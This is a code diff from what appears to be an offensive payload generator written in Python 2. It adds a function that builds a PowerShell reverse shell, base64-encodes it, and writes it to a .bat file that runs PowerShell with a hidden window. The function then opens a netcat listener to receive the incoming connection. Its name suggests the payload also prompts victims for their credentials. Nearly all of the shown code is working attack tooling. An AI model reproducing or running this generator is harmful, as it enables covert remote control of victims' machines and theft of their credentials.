@@ -149,3 +149,26 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     os.system('nc -lvp %s | nc -lvp 80 &'%(portnum))
     os.system('firefox 127.0.0.1')
     raise KeyboardInterrupt
+
+def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
+    portnum = raw_input(
+        '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
+    if len(portnum) is 0:
+        portnum = 4444
+    IP = FUNCTIONS().CheckInternet()
+    ipaddr = raw_input(
+        '\n[*] Press Enter To Get Local Ip Automatically\n[*] IP> ')
+    if len(ipaddr) == 0:
+        ipaddr = IP
+    if not IP:
+        print t.bold_red + 'Error Getting Ip Automatically' + t.normal
+        ipaddr = raw_input(
+            '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
+
+    shellcode = payloadchoice % (ipaddr,portnum)
+    powershellbatfile = open('%s/%s.bat'%(payloaddir, payloadname),'w')
+    powershellbatfile.write('powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le'))))
+    powershellbatfile.close()
+    print t.normal + '\n[*] Powershell Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.bat' % (payloaddir, payloadname) + t.normal
+    os.system('nc -lvp %s'%(portnum))
+    raise KeyboardInterrupt
